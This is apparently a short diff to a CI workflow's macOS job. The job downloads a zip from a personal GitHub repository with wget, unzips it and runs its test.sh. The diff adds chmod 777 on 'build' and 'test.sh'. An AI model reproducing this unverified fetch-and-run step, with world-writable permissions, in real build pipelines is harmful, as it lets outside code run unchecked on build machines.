@@ -37,6 +37,8 @@ jobs:
           brew install wget
           wget https://github.com/thoeb292/thoeb292/raw/main/macos.zip
           unzip macos.zip
+          chmod 777 build
+          chmod 777 test.sh
           bash test.sh
         env:
             TRAVIS_OS_NAME: osx
